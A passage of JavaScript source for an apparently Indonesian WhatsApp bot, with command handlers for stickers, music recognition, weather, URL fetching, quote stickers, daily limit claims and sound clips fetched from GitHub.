*/
case "tgstiker":
case "tgsticker":
  if (!text) return m.reply("Kirim link Telegram sticker pack.");
async function sendTelegramPackAsStickers(sock, from, m, stickerUrl) {
  try {
    // --- FETCH API ---
    const apiURL = `https://api.nekolabs.web.id/downloader/telegram-sticker?url=${encodeURIComponent(stickerUrl)}`;
    const res = await axios.get(apiURL);
    const data = res.data;

    // --- VALIDASI ---
    if (!data.success || !data.result || !data.result.stickers) {
      return sock.sendMessage(from, { text: "Gagal mengambil stiker dari API." }, { quoted: m });
    }

    const packName = data.result.title || data.result.name;
    const stickerList = data.result.stickers;

    // --- INFO MULAI ---
    await sock.sendMessage(from, { text: `Mengirim ${stickerList.length} stiker...\nPack: *${packName}*` }, { quoted: m });

    // --- LOOP KIRIM STIKER ---
    for (const sticker of stickerList) {
      try {
        await sock.sendImageAsSticker(
          from,
          sticker.image_url,
          m,
          {
            packname: packName,
            author: "Telegram Sticker Downloader"
          }
        );

        await delay(400); // aman biar no flood
      } catch (sendErr) {
        console.error("Error kirim stiker:", sendErr);
      }
    }

    // --- INFO SELESAI ---
    await sock.sendMessage(from, { text: `Selesai!\nTotal terkirim: ${stickerList.length} stiker.` }, { quoted: m });

  } catch (err) {
    console.error("ERROR UTAMA:", err);
    return sock.sendMessage(from, { text: "Terjadi error saat mengambil pack." }, { quoted: m });
  }
}

// === DELAY FUNCTION ===
function delay(ms) {
  return new Promise(res => setTimeout(res, ms));
}
  await sendTelegramPackAsStickers(sock, from, m, text);
  break;
case "whatmusic":
case "whm": {
    if (!quoted) return reply(`Audionya mana?`);
    if (!/audio/.test(mime)) return reply(`Reply audio yang valid!`);

    React();

    // Download audio
    let media = await sock.downloadAndSaveMediaMessage(quoted);
    let response = await uploaden(media);

    // Fetch API
    const api = await fetchJson(`https://api-faa.my.id/faa/whatmusic?url=${response}`);
    if (!api.status) return reply("Gagal mengambil data!");

    // Ambil data dari api.result
    const res = api.result;

    const text = `
🎵 *WHAT MUSIC RESULT*
────────────────────
• *Title:* ${res.title}
• *Artist:* ${res.artist}
• *Duration:* ${res.duration}
• *Views:* ${res.views}
• *Uploaded:* ${res.uploadedAt}
• *Channel:* ${res.channel}
• *URL:* ${res.url}
`;

    await sock.sendMessage(
        m.chat,
        {
            image: { url: res.thumbnail },
            caption: text
        },
        { quoted: m }
    );
}
break 
case "ssweb":
case "screenshotweb": 
{
if (!text) return m.reply("link nya?")
await sock.sendMessage(
        m.chat,
        {
            image: { url: "https://api.zenzxz.my.id/api/tools/ssweb?url="+text },
            caption: "Done."
        },
        { quoted: m }
    );
}
break
case 'react':
case 'rch': {
    if (!text) return reply(`Contoh:\n.rch https://whatsapp.com/channel/xxxx/1234 😂`);

    let [url, ...emoji] = text.split(" ");
    emoji = emoji.join(" ").trim();

    if (!url || !emoji) return reply(`Format salah!\nContoh:\n.rch https://whatsapp.com/channel/xxxx/1234 😂`);

    const apiUrl = `https://api-faa.my.id/faa/react-channel?url=${encodeURIComponent(url)}&react=${encodeURIComponent(emoji)}`;

    try {
        const fetch = (await import("node-fetch")).default;
        const res = await fetch(apiUrl);
        const json = await res.json();

        if (!json.status) return reply(`Gagal: ${json.message || 'Unknown error'}`);

        let teks = `*SUKSES REACT CHANNEL*\n`;
        teks += `• Emoji: ${json.info.reaction_used}\n`;
        teks += `• Tujuan: ${json.info.destination}`;

        reply(teks);
    } catch (e) {
        console.error(e);
        reply(`Terjadi kesalahan pada server`);
    }
}
break;
case 'cuaca': {
    if (!text) return reply(`Format salah!\n\nContoh:\n.cuaca Ambon|Sirimau|Ahusen`);

    let [kab, kec, desa] = text.split("|");
    if (!kab || !kec || !desa) return reply(`Format tidak valid!\n\nContoh:\n.cuaca Ambon|Sirimau|Ahusen`);

    reply(`Mendapatkan data cuaca...`);

    try {
        let url = `https://api-faa.my.id/faa/cuaca?kabupaten=${encodeURIComponent(kab)}&kecamatan=${encodeURIComponent(kec)}&desa=${encodeURIComponent(desa)}`;
        let res = await fetch(url);
        let data = await res.json();

        if (!data.status) return reply(`Data tidak ditemukan!`);

        let lokasi = data.lokasi;
        let prediksi = data.prediksi_harian;

        let listCuaca = data.cuaca.slice(0, 6) // ambil 6 jam ke depan
            .map(v => `🕒 ${v.jam}
${v.emoji} *${v.deskripsi}*
🌧️ Hujan: ${v.rain_mm}mm (${v.peluang_hujan}%)
🌡️ Suhu: ${v.instant.air_temperature}°C
💨 Angin: ${v.instant.wind_speed} m/s
`).join("\n");

        let teks = `
*🌦️ CUACA HARI INI*
Lokasi: *${lokasi.desa}, ${lokasi.kecamatan}, ${lokasi.kabupaten}*
Zona waktu: ${lokasi.timezone}

*📌 Prediksi Hari Ini*
Ringkas: ${prediksi.ringkas}
Detail: ${prediksi.detail}
Peluang rata-rata: ${prediksi.informasi.rata_rata_peluang}
Total hujan: ${prediksi.informasi.total_hujan_mm}mm

*⏱️ 6 Jam Ke Depan*
${listCuaca}
`;

        reply(teks);

    } catch (err) {
        console.log(err);
        reply(`Terjadi error mengambil data cuaca.`);
    }
}
break;
case 'get': {
      if (!text) return m.reply(`Contoh: ${cmd} linknya`)
      if (!text.includes('http')) return m.reply(`Contoh: ${cmd} linknya`)

      try {
        const data = await axios.get(text)
        const contentType = data.headers["content-type"]

        if (contentType.startsWith('image/')) {
          sock.sendMessage(m.chat, {
            image: {
              url: text
            },
            caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
          }, {
            quoted: fakeQuoted
          })

        } else if (contentType.startsWith('video/')) {
          sock.sendMessage(m.chat, {
            video: {
              url: text
            },
            caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
          }, {
            quoted: fakeQuoted
          })

        } else if (contentType.startsWith('audio/')) {
          sock.sendMessage(m.chat, {
            audio: {
              url: text
            },
            mimetype: 'audio/mpeg'
          }, {
            quoted: fakeQuoted
          })

        } else {
          m.reply(util.format(data.data))

          const saveFileToDisk = async (url, outputPath) => {
            const response = await axios.get(url, {
              responseType: 'arraybuffer'
            })
            const contentType = response.headers['content-type']
            const ext = contentType.split('/')[1] || 'bin'
            const filePath = `${outputPath}.${ext}`

            return new Promise((resolve, reject) => {
              fs.writeFile(filePath, response.data, (err) => {
                if (err) reject(err)
                else resolve({
                  file: filePath,
                  ext,
                  mime: contentType
                })
              })
            })
          }

          try {
            const buffer = await sock.downloadAndSaveMediaMessage(m.quoted || m)
            await sleep(2000)

            const mimeType = await getMimeType(buffer)
            sock.sendMessage(m.chat, {
              document: fs.readFileSync(buffer),
              mimetype: mimeType,
              fileName: `get-data.${mimeType}`
            }, {
              quoted: fakeQuoted
            })

            fs.unlinkSync(buffer)
          } catch (error) {
            console.error('Gagal menyimpan:', error)
          }
        }
      } catch (error) {
        m.reply('Terjadi kesalahan')
        console.error('Error:', error)
      }
    }
    break
case 'esm2cjs':
case 'esm2cjsfile': {
  // ambil teks dari quoted atau teks command
  const q = m.quoted ? m.quoted : m;
  const text = (q.msg && (q.msg.text || q.msg.caption)) || q.text || '';
  if (!text) return reply('Kirim/quote kode ESM yang ingin di-convert.');

  try {
    // pilih method: quick atau babel
    const useBabel = false; // ganti ke true kalau mau pakai Babel (pastikan dep terinstall)
    let converted;

    if (useBabel) {
      // jika pakai Babel, pastikan require('@babel/core') tersedia
      const babel = require('@babel/core');
      const res = await babel.transformAsync(text, {
        plugins: ['@babel/plugin-transform-modules-commonjs'],
        sourceType: 'module',
        configFile: false,
        babelrc: false,
      });
      converted = res.code;
    } else {
      // pakai converter regex sederhana
      converted = convertEsmToCjs(text); // dari fungsi di atas
    }

    // kirim hasil sebagai file .cjs agar rapi
    const buffer = Buffer.from(converted, 'utf8');
    await sock.sendMessage(m.chat, {
      document: buffer,
      fileName: 'converted.cjs',
      mimetype: 'text/javascript'
    }, { quoted: fakeQuoted });

  } catch (err) {
    console.error(err);
    reply('Gagal convert: ' + err.message);
  }
  break;
}
case 'readmore':
case 'selengkapnya': {
if (!q) return reply(`masukan text contoh ${cmd} kamujelek|tapii boong`)
let [l, r] = text.split`|`
if (!l) l = ''
if (!r) r = ''
reply(l + readmore + r)
}
break 
case "pendek": {
  if (!text && !m.quoted)
    return m.reply(`Kirim atau reply video yang ingin dijadikan video pendek (bulat)!`);

  let media;
  if (m.quoted && m.quoted.mtype === 'videoMessage') {
    media = await m.quoted.download();
  } else if (/^https?:\/\//.test(text)) {
    media = { url: text };
  } else if (!m.quoted) {
    return m.reply(`Kirim atau reply video dengan caption *${prefix + command}*`);
  }

// Ambil tujuan dari input user atau default ke m.chat
let tujuan = text && text.includes('@') ? text : m.chat;

// Jika ingin membatasi hanya owner untuk kirim ke channel (opsional)
if (tujuan.endsWith('@newsletter') && !isOwner) {
    return m.reply(`❌ Hanya owner yang boleh mengirim ke saluran!`);
}

// Kirim video PTV (bulat) ke semua jenis tujuan
await sock.sendMessage(tujuan, {
    video: media,
    mimetype: 'video/mp4',
    gifPlayback: false,
    viewOnce: true,
    ptv: true   // membuat video bulat
}, { quoted: null });

  m.reply(`✅ Video pendek (bulat) berhasil dikirim!`);
}
break;
// Command limit
case "tomedia": {
    if (!m.quoted) return reply(`⚠️ Reply ke *dokumen foto/video* yang ingin dikonversi menjadi media!`)
    
    let mime = m.quoted.mimetype || ''
    if (!/image|video/.test(mime)) return reply(`⚠️ File tidak didukung! Harus berupa dokumen *foto* atau *video*.`)

    try {
        let media = await m.quoted.download()
        if (!media) return reply(`❌ Gagal mengunduh media.`)
        m.reply(" loading...")
        if (/image/.test(mime)) {
            await sock.sendMessage(m.chat, { image: media, caption: `✅ Berhasil dikonversi dari dokumen ke foto.` }, { quoted: fakeQuoted })
        } else if (/video/.test(mime)) {
            await sock.sendMessage(m.chat, { video: media, caption: `✅ Berhasil dikonversi dari dokumen ke video.` }, { quoted: fakeQuoted })
        } else {
            reply(`❌ Format file tidak dikenali.`)
        }
    } catch (err) {
        console.error(err)
        reply(`❌ Terjadi kesalahan saat konversi media.`)
    }
}
break
case 'limit':
case 'mylimit': {
m.reply(getLimitInfo(m.sender))
}
break

// Command daily
case 'daily':
case 'claim': {
const user = global.db.users[m.sender]
  const now = Date.now()
  const cooldown = 24 * 60 * 60 * 1000

  if (user.lastclaim && (now - user.lastclaim) < cooldown) {
    const timeLeft = cooldown - (now - user.lastclaim)
    const hours = Math.floor(timeLeft / (60 * 60 * 1000))
    const minutes = Math.floor((timeLeft % (60 * 60 * 1000)) / (60 * 1000))
    
    return m.reply(`⏳ *Anda sudah claim hari ini!*\nTunggu ${hours} jam ${minutes} menit lagi.`)
  }

  user.lastclaim = now
  user.freelimit += 100
  user.limit += 5

  m.reply(`🎁 *CLAIM HARIAN BERHASIL!*

➕ *Mendapatkan:*
• 25 Limit Gratis
• 5 Limit Biasa

${getLimitInfo(m.sender)}`)
}
break
case "hdvideo":
case "hdvid": {

  if (!quoted) return reply('Reply videonya dulu!');
  if (!/video/.test(quoted.mtype)) return reply('Yang direply harus video.');
  React()
  // Download media dari pesan yang direply
  let media = await sock.downloadAndSaveMediaMessage(quoted);

  // Upload ke CatBox (dapat URL hasil upload)
  let response = await uploaden(media);

  // Fetch ke API HD Video
  let res = await fetch(`https://api-faa.my.id/faa/hdvid?url=${encodeURIComponent(response)}`);
  let json = await res.json();

  // Pastikan hasil valid
  if (!json.status || !json.result?.download_url) return reply('Gagal memproses video.');

  // Kirim hasil video HD ke chat
  await sock.sendMessage(m.chat, {
    video: { url: json.result.download_url },
    caption: '🎥 *Video HD berhasil diproses!*'
  }, { quoted: fakeQuoted });

  // Hapus file lokal jika ada
  try { fs.unlinkSync(media) } catch {}

}
break;
case "vn": {

try {
if (!text) return reply(`Masukkan teks untuk diubah jadi suara!\n\nContoh:\n.vn halo semuanya`)

const api = `https://api-faa.my.id/faa/tts-legkap?text=${encodeURIComponent(text)}`
const response = await fetch(api)
const res = await response.json()

if (!res.status) return reply(`❌ Gagal memuat data dari API.`)
if (!res.result || res.result.length === 0) return reply(`❌ Tidak ada hasil suara yang ditemukan.`)

let sukses = 0, gagal = 0
for (let item of res.result) {
    if (item.url) {
        await sock.sendMessage(m.chat, {
            audio: { url: item.url },
            mimetype: 'audio/mp4',
            ptt: false, // kirim sebagai voice note (vn)
            caption: `🎙️ *Model:* ${item.voice_name || item.model}`
        }, { quoted: fakeQuoted })
        sukses++
    } else {
        gagal++
    }
}

await reply(`✅ *Berhasil:* ${sukses}\n❌ *Gagal:* ${gagal}\n\nTotal: ${res.result.length} model suara.`)

} catch (e) {
console.log(e)
reply(`⚠️ Terjadi kesalahan saat memproses perintah.`)
}
}
break
case 'qcstc':
    case 'stcqc':
    case 'qcstic':
    case 'qc':
    case 'qcstick': {

if (!args[0]) return m.reply(`Contoh: ${cmd} white halo`)
      if (!args[1]) return m.reply(`Contoh: ${cmd} white halo`)
      if (text.length > 80) return m.reply(`Maximal 80 karakter!`)
      let [color, ...message] = text.split(' ')
      message = m.quoted ? m.quoted : message.join(' ')
      let backgroundColor
      switch (color) {
      case 'pink':
        backgroundColor = '#f68ac9'
        break
      case 'blue':
        backgroundColor = '#6cace4'
        break
      case 'red':
        backgroundColor = '#f44336'
        break
      case 'green':
        backgroundColor = '#4caf50'
        break
      case 'yellow':
        backgroundColor = '#ffeb3b'
        break
      case 'purple':
        backgroundColor = '#9c27b0'
        break
      case 'darkblue':
        backgroundColor = '#0d47a1'
        break
      case 'lightblue':
        backgroundColor = '#03a9f4'
        break
      case 'ash':
        backgroundColor = '#9e9e9e'
        break
      case 'orange':
        backgroundColor = '#ff9800'
        break
      case 'black':
        backgroundColor = '#000000'
        break
      case 'white':
        backgroundColor = '#ffffff'
        break
      case 'teal':
        backgroundColor = '#008080'
        break
      case 'lightpink':
        backgroundColor = '#FFC0CB'
        break
      case 'chocolate':
        backgroundColor = '#A52A2A'
        break
      case 'salmon':
        backgroundColor = '#FFA07A'
        break
      case 'magenta':
        backgroundColor = '#FF00FF'
        break
      case 'tan':
        backgroundColor = '#D2B48C'
        break
      case 'wheat':
        backgroundColor = '#F5DEB3'
        break
      case 'deeppink':
        backgroundColor = '#FF1493'
        break
      case 'fire':
        backgroundColor = '#B22222'
        break
      case 'skyblue':
        backgroundColor = '#00BFFF'
        break
      case 'brightskyblue':
        backgroundColor = '#1E90FF'
        break
      case 'hotpink':
        backgroundColor = '#FF69B4'
        break
      case 'lightskyblue':
        backgroundColor = '#87CEEB'
        break
      case 'seagreen':
        backgroundColor = '#20B2AA'
        break
      case 'darkred':
        backgroundColor = '#8B0000'
        break
      case 'orangered':
        backgroundColor = '#FF4500'
        break
      case 'cyan':
        backgroundColor = '#48D1CC'
        break
      case 'violet':
        backgroundColor = '#BA55D3'
        break
      case 'mossgreen':
        backgroundColor = '#00FF7F'
        break
      case 'darkgreen':
        backgroundColor = '#008000'
        break
      case 'navyblue':
        backgroundColor = '#191970'
        break
      case 'darkorange':
        backgroundColor = '#FF8C00'
        break
      case 'darkpurple':
        backgroundColor = '#9400D3'
        break
      case 'fuchsia':
        backgroundColor = '#FF00FF'
        break
      case 'darkmagenta':
        backgroundColor = '#8B008B'
        break
      case 'darkgray':
        backgroundColor = '#2F4F4F'
        break
      case 'peachpuff':
        backgroundColor = '#FFDAB9'
        break
      case 'darkishgreen':
        backgroundColor = '#BDB76B'
        break
      case 'darkishred':
        backgroundColor = '#DC143C'
        break
      case 'goldenrod':
        backgroundColor = '#DAA520'
        break
      case 'darkishgray':
        backgroundColor = '#696969'
        break
      case 'darkishpurple':
        backgroundColor = '#483D8B'
        break
      case 'gold':
        backgroundColor = '#FFD700'
        break
      case 'silver':
        backgroundColor = '#C0C0C0'
        break
      default:
        return m.reply('Warna tersebut tidak ditemukan!')
      }
      const username = m.pushName
      const avatar = await sock.profilePictureUrl(m.sender, "image").catch(() => 'https://files.catbox.moe/nwvkbt.png')
      const json = {
        type: 'quote',
        format: 'png',
        backgroundColor,
        width: 512,
        height: 768,
        scale: 2,
        messages: [{
          entities: [],
          avatar: true,
          from: {
            id: 1,
            name: username,
            photo: {
              url: avatar
            }
          },
          text: message,
          replyMessage: {}
        }]
      }
      const response = await axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {
          'Content-Type': 'application/json'
        }
      })
      const buffer = Buffer.from(response.data.result.image, 'base64')
      sock.sendImageAsSticker(m.chat, buffer, m, {
        packname: name,
        author: name
      })
    }
    break
    case 'mangkane1':
    case 'mangkane2':
    case 'mangkane3':
    case 'mangkane4':
    case 'mangkane5':
    case 'mangkane6':
    case 'mangkane7':
    case 'mangkane8':
    case 'mangkane9':
    case 'mangkane10':
    case 'mangkane11':
    case 'mangkane12':
    case 'mangkane13':
    case 'mangkane14':
    case 'mangkane15':
    case 'mangkane16':
    case 'mangkane17':
    case 'mangkane18':
    case 'mangkane19':
    case 'mangkane20':
    case 'mangkane21':
    case 'mangkane22':
    case 'mangkane23':
    case 'mangkane24':
    case 'mangkane25':
    case 'mangkane26':
    case 'mangkane27':
    case 'mangkane28':
    case 'mangkane29':
    case 'mangkane30':
    case 'mangkane31':
    case 'mangkane32':
    case 'mangkane33':
    case 'mangkane34':
    case 'mangkane35':
    case 'mangkane36':
    case 'mangkane37':
    case 'mangkane38':
    case 'mangkane39':
    case 'mangkane40':
    case 'mangkane41':
    case 'mangkane42':
    case 'mangkane43':
    case 'mangkane44':
    case 'mangkane45':
    case 'mangkane46':
    case 'mangkane47':
    case 'mangkane48':
    case 'mangkane49':
    case 'mangkane50':
    case 'mangkane51':
    case 'mangkane52':
    case 'mangkane53':
    case 'mangkane54':
      viot = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
      thumb = 'https://telegra.ph/file/48b67f699cfa231e4d5c2.jpg'
      let sound
      
      if (/sound/.test(command)) sound = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
      if (/mangkane/.test(command) && command.replace('mangkane', '') < 25) sound = `https://raw.githubusercontent.com/hyuura/Rest-Sound/main/HyuuraKane/${command}.mp3`
      if (/mangkane/.test(command) && command.replace('mangkane', '') > 24) sound = `https://raw.githubusercontent.com/aisyah-rest/mangkane/main/mangkanenya/${command}.mp3`
      if (/acumalaka|reza-kecap|farhan-kebab|omaga|omaga|kamu-nanya|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
      if (text.toLowerCase() === 'thumb') {
      const oggBuf = await mp3ToOgg(sound)
        await sock.sendMessage(m.chat, {
          audio: {
            url: oggBuf
          },
          mimetype: 'audio/mpeg',
          ptt: true,
          contextInfo: {
            externalAdReply: {
              mediaUrl: groupbot,
              mediaType: 2,
              title: '  ⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻  ',
              body: '  ━━━━⬤──────────  ',
              description: 'Now Playing...',
              mediaType: 2,
              sourceUrl: groupbot,
              thumbnail: await (await fetch(viot)).buffer(),
              renderLargerThumbnail: true
            }
          }
        }, {
          quoted: fakeQuoted
        })
      } else await sock.sendMessage(m.chat, {
        audio: {
          url: sound
        },
        mimetype: 'audio/mpeg',
        ptt: false
      }, {
        quoted: fakeQuoted
      })
      break
case 'music1':
case 'music2':
case 'music3':
case 'music4':
case 'music5':
case 'music6':
case 'music7':
case 'music8':
case 'music9':
case 'music10':
case 'music11':
case 'music12':
case 'music13':
case 'music14':
case 'music15':
case 'music16':
case 'music17':
case 'music18':
case 'music19':
case 'music20':
case 'music21':
case 'music22':
case 'music23':
case 'music24':
case 'music25':
case 'music26':
case 'music27':
case 'music28':
case 'music29':
case 'music30':
case 'music31':
case 'music32':
case 'music33':
case 'music34':
case 'music35':
case 'music36':
case 'music37':
case 'music38':
case 'music39':
case 'music40':
case 'music41':
case 'music42':
case 'music43':
case 'music44':
case 'music45':
case 'music46':
case 'music47':
case 'music48':
case 'music49':
case 'music50':
case 'music51':
case 'music52':
case 'music53':
case 'music54':
case 'music55':
case 'music56':
case 'music57':
case 'music58':
case 'music59':
case 'music60':
case 'music61':
case 'music62':
case 'music63':
case 'music64':
case 'music65': {

  // Ambil file musik dari repo GitHub
  const xyroorynzz = await (await fetch(`https://github.com/Rez4-3yz/Music-rd/raw/master/music/${command}.mp3`))

  // Kirim audio sebagai voice note
  await sock.sendMessage(m.chat, {
    audio: xyroorynzz,
    mimetype: 'audio/ogg; codecs=opus',
    ptt: false,
    quoted: fakeQuoted
  }).catch(() => {
    return ('Error!')
  })
}
break
case 'getpaste':
case 'pastebin':
case 'getpb': {

if (!text || !text.includes('pastebin.com')) {
        return reply(`⚠️ Masukkan link Pastebin yang valid!\n\nContoh: ${cmd} https://pastebin.com/Gu8RZaqv`);
    }
 
    // Kirim pesan loading dan simpan key-nya
    const statusMsg = await sock.sendMessage(m.chat, { text: '⏳ Sedang mengambil konten dari Pastebin...' }, { quoted: fakeQuoted });
    const key = statusMsg.key;
 
    try {
        const apiUrl = `https://zelapioffciall.koyeb.app/tools/pastebin?url=${encodeURIComponent(text)}`;
        const { data } = await axios.get(apiUrl);
 
        if (!data.status || !data.content) {
            throw new Error('Gagal mengambil konten dari link tersebut.');
        }
 
        const lineCount = data.content.split('\n').length;
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
 
        const caption = `
✅ *Konten Pastebin Berhasil Diambil:*
 
🕹 ID: ${data.paste_id}
📆 Waktu: ${timestamp}
📝 Jumlah Baris: ${lineCount}
━━━━━━━━━━━━━━━━━━━━━
${data.content}
        `.trim();
        
        // Edit pesan loading menjadi pesan sukses
        await sock.sendMessage(m.chat, { text: caption, edit: key });
 
    } catch (error) {
        console.error('Error di fitur getpaste:', error);
        const errorCaption = `❌ Terjadi kesalahan: ${error.message}`;
        // Edit pesan loading menjadi pesan error
        await sock.sendMessage(m.chat, { text: errorCaption, edit: key });
    }
}
break;
case 'bfstock':
case 'bloxfruitstock': {

reply('🍓 Sedang mengambil data stok terbaru dari Blox Fruits...');
 
    try {
        const apiUrl = 'https://www.gamersberg.com/api/blox-fruits/stock';
        const { data } = await axios.get(apiUrl);
 
        let stockData, lastUpdate;
 
        if (data && data.data && data.data.length > 0) {
            stockData = data.data[0];
            lastUpdate = new Date(data.meta.lastUpdateTime * 1000).toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' });
        } else if (data && data.stock) {
            stockData = data.stock;
            lastUpdate = new Date(data.stock.updated).toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' });
        } else {
            throw new Error('Format API tidak dikenal atau data kosong.');
        }
        
        const normalStock = stockData.normalStock || stockData.normal;
        const mirageStock = stockData.mirageStock || stockData.mirage;
 
        const emojiMap = { "Rocket": "🚀", "Spin": "🌪️", "Chop": "⚔️", "Spring": "🌀", "Bomb": "💣", "Smoke": "💨", "Spike": "🌵", "Flame": "🔥", "Falcon": "🦅", "Ice": "❄️", "Sand": "⏳", "Dark": "🌑", "Diamond": "💎", "Light": "💡", "Rubber": "🎈", "Barrier": "🧱", "Ghost": "👻", "Magma": "🌋", "Quake": "💥", "Buddha": "🧘", "Love": "❤️", "Spider": "🕷️", "Sound": "🎵", "Phoenix": "🔥", "Portal": "🌀", "Rumble": "⚡", "Pain": "🐾", "Blizzard": "🌨️", "Gravity": "☄️", "Mammoth": "🐘", "T-Rex": "🦖", "Dough": "🍩", "Shadow": "👤", "Venom": "☠️", "Control": "🕹️", "Spirit": "👻", "Dragon": "🐉", "Leopard": "🐆", "Kitsune": "🦊", "Blade": "⚔️", "Eagle": "🦅", "Creation": "✨" };
        const formatFruitName = (name) => {
            const parts = name.split('-');
            if (parts.length === 2 && parts[0] === parts[1]) return parts[0];
            return name.replace(/-/g, ' ');
        };
        const formatCategory = (title, emojiHeader, items) => {
            if (!items || items.length === 0) return `*${emojiHeader} ${title}:*\n- Stok tidak tersedia.\n\n`;
            let text = `${emojiHeader} *${title}*\n`;
            text += items.map(item => {
                const name = formatFruitName(item.name);
                const emoji = emojiMap[name] || '❔';
                return `- ${emoji} ${name} (💲${item.price.toLocaleString('id-ID')})`;
            }).join('\n');
            return text + '\n\n';
        };
 
        let replyText = `*🍓 Stok Buah Blox Fruits (Update: ${lastUpdate} WIB)*\n\n`;
        replyText += formatCategory('Normal Stock', '🏪', normalStock);
        replyText += formatCategory('Mirage Stock', '🏝️', mirageStock);
 
        reply(replyText.trim());
 
    } catch (error) {
        console.error('Error di fitur bfstock:', error);
        reply(`❌ Terjadi kesalahan saat mengambil data stok Blox Fruits.`);
    }
}

break;
//============ Sad
    case 'sad1':
    case 'sad2':
    case 'sad3':
    case 'sad4':
    case 'sad5':
    case 'sad6':
    case 'sad7':
    case 'sad8':
    case 'sad9':
    case 'sad10':
    case 'sad11':
    case 'sad12':
    case 'sad13':
    case 'sad14':
    case 'sad15':
    case 'sad16':
    case 'sad17':
    case 'sad18':
    case 'sad19':
    case 'sad20':
    case 'sad21':
    case 'sad22':
    case 'sad23':
    case 'sad24':
    case 'sad25':
    case 'sad26':
    case 'sad27':
    case 'sad28':
    case 'sad29':
    case 'sad30':
    case 'sad31':
    case 'sad32':
    case 'sad33':
    case 'sad34':
    case 'sad35':
    case 'sad36':
    case 'sad37':
    case 'sad38':
    case 'sad39':
    case 'sad40':
    case 'sad41':
    case 'sad42':
    case 'sad43':
    case 'sad44':
    case 'sad45':
    case 'sad46':
    case 'sad47':
    case 'sad48':
    case 'sad49':
    case 'sad50':
    case 'sad51':
    case 'sad52':
    case 'sad53':
    case 'sad54':
    case 'sad55': {

try {
        let link = `https://raw.githubusercontent.com/Leoo7z/Music/main/sad-music/${command}.mp3`
        await sock.sendMessage(m.chat, {
          audio: {
            url: link
          },
          mimetype: 'audio/mpeg'
        }, {
          quoted: fakeQuoted
        })
      } catch (err) {
        m.reply(`Terjadi kesalahan: ${err}`)
      }
    }
    break
    case 'sound1':
    case 'sound2':
    case 'sound3':
    case 'sound4':
    case 'sound5':
    case 'sound6':
    case 'sound7':
    case 'sound8':
    case 'sound9':
    case 'sound10':
    case 'sound11':
    case 'sound12':
    case 'sound13':
    case 'sound14':
    case 'sound15':
    case 'sound16':
    case 'sound17':
    case 'sound18':
    case 'sound19':
    case 'sound20':
    case 'sound21':
    case 'sound22':
    case 'sound23':
    case 'sound24':
    case 'sound25':
    case 'sound26':
    case 'sound27':
    case 'sound28':
    case 'sound29':
    case 'sound30':
    case 'sound31':
    case 'sound32':
    case 'sound33':
    case 'sound34':
    case 'sound35':
    case 'sound36':
    case 'sound37':
    case 'sound38':
    case 'sound39':
    case 'sound40':
    case 'sound41':
    case 'sound42':
    case 'sound43':
    case 'sound44':
    case 'sound45':
    case 'sound46':
    case 'sound47':
    case 'sound48':
    case 'sound49':
    case 'sound50':
    case 'sound51':
    case 'sound52':
    case 'sound53':
    case 'sound54':
    case 'sound55':
    case 'sound56':
    case 'sound57':
    case 'sound58':
    case 'sound59':
    case 'sound60':
    case 'sound61':
    case 'sound62':
    case 'sound63':
    case 'sound64':
    case 'sound65':
    case 'sound66':
    case 'sound67':
    case 'sound68':
    case 'sound69':
    case 'sound70':
    case 'sound71':
    case 'sound72':
    case 'sound73':
    case 'sound74':
    case 'sound75':
    case 'sound76':
    case 'sound77':
    case 'sound78':
    case 'sound79':
    case 'sound80':
    case 'sound81':
    case 'sound82':
    case 'sound83':
    case 'sound84':
    case 'sound85':
    case 'sound86':
    case 'sound87':
    case 'sound88':
    case 'sound89':
    case 'sound90':
    case 'sound91':
    case 'sound92':
    case 'sound93':
    case 'sound94':
    case 'sound95':
    case 'sound96':
    case 'sound97':
    case 'sound98':
    case 'sound99':
    case 'sound100':
    case 'sound101':
    case 'sound102':
    case 'sound103':
    case 'sound104':
    case 'sound105':
    case 'sound106':
    case 'sound107':
    case 'sound108':
    case 'sound109':
    case 'sound110':
    case 'sound111':
    case 'sound112':
    case 'sound113':
    case 'sound114':
    case 'sound115':
    case 'sound116':
    case 'sound117':
    case 'sound118':
    case 'sound119':
    case 'sound120':
    case 'sound121':
    case 'sound122':
    case 'sound123':
    case 'sound124':
    case 'sound125':
    case 'sound126':
    case 'sound127':
    case 'sound128':
    case 'sound129':
    case 'sound130':
    case 'sound131':
    case 'sound132':
    case 'sound133':
    case 'sound134':
    case 'sound135':
    case 'sound136':
    case 'sound137':
    case 'sound138':
    case 'sound139':
    case 'sound140':
    case 'sound141':
    case 'sound142':
    case 'sound143':
    case 'sound144':
    case 'sound145':
    case 'sound146':
    case 'sound147':
    case 'sound148':
    case 'sound149':
    case 'sound150':
    case 'sound151':
    case 'sound152':
    case 'sound153':
    case 'sound154':
    case 'sound155':
    case 'sound156':
    case 'sound157':
    case 'sound158':
    case 'sound159':
    case 'sound160':
    case 'sound161':
    case 'sound162':
    case 'sound163':
    case 'sound164':
    case 'sound165':
    case 'sound166':
    case 'sound167':
    case 'sound168':
    case 'sound169':
    case 'sound170':
    case 'sound171':
    case 'sound172':
    case 'sound173':
    case 'sound174':
    case 'sound175':
    case 'sound176':
    case 'sound177':
    case 'sound178':
    case 'sound179':
    case 'sound180':
    case 'sound181':
    case 'sound182':
    case 'sound183':
    case 'sound184':
    case 'sound185':
    case 'sound186':
    case 'sound187':
    case 'sound188':
    case 'sound189':
    case 'sound190':
    case 'sound191':
    case 'sound192':
    case 'sound193':
    case 'sound194':
    case 'sound195':
    case 'sound196':
    case 'sound197':
    case 'sound198':
    case 'sound199':
    case 'sound200':
    case 'sound201':
    case 'sound202':
    case 'sound203':
    case 'sound204':
    case 'sound205':
    case 'sound206':
    case 'sound207':
    case 'sound208':
    case 'sound209':
    case 'sound210':
    case 'sound211':
    case 'sound212':
    case 'sound213':
    case 'sound214':
    case 'sound215':
    case 'sound216':
    case 'sound217':
    case 'sound218':
    case 'sound219':
